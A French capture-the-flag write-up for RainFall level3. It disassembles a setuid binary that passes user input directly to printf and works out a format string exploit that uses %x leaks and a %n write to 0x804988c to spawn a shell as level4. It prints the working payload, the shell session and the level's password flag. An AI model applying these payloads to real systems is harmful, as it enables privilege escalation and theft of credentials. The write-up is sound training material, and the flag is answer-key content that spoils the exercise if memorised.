# 03 - Format string 1

- On se connecte en tant que level3:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

```
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

level3@RainFall:~$ gdb level3
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
```

```
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```


- Voyons les parties les plus importantes du programme:
```
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
```
> Prompt pour 512 octets dans une zone mémoire de 520 octets.

```
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
```
> Appel de `<printf@plt>` avec notre buffer comme premier paramètre.

```
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
```
>`0x804988c <m>:  0x00000000`

> Après l'appel à `<printf@plt>`, compare la valeur située à `0x804988c` avec la constante 0x40 (64 en décimal). Si les deux valeurs diffèrent, on `leave` puis on `ret`, sinon on continue.

```
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
```
>`0x804860d: "/bin/sh"`

>Ouvre un terminal.


- Cette exercice est une introduction au [format string attack](https://axcheron.github.io/exploit-101-format-strings/). Le contenu de notre buffer est utilisé comme premier paramètre de la fonction `<printf@plt>`, donc on peut lire/écrire n'importe quoi sur la stack.
```
level3@RainFall:~$ echo -ne 'BBBB %x %x %x %x %x \n' | ./level3
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520
```

```
level3@RainFall:~$ echo -ne 'BBBB %4$x \n' | ./level3
BBBB 42424242
```

```
level3@RainFall:~$ echo -ne '\x8c\x98\x04\x08 %4$x \n' | ./level3
 804988c
```


- Avec `<printf@plt>`, `%x` nous permet d'afficher une valeur hexadécimale, et `%n` nous permet d'assigner une valeur à une adresse, cette valeur correspond au nombre de caractères écrits jusqu'au `%n` en question, du coup:
```
level3@RainFall:~$ gdb level3
...
(gdb) b*0x080484df
```

```
(gdb) r < <(echo -ne '\x8c\x98\x04\x08 %4$n \n')
...
(gdb) x/d 0x804988c
0x804988c <m>:  5
```

```
(gdb) r < <(echo -ne '\x8c\x98\x04\x08 %58x %4$n \n')
...
(gdb) x/d 0x804988c
0x804988c <m>:  64
```

```
level3@RainFall:~$ (echo -ne '\x8c\x98\x04\x08 %58x %4$n \n'; cat) | ./level3
...
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```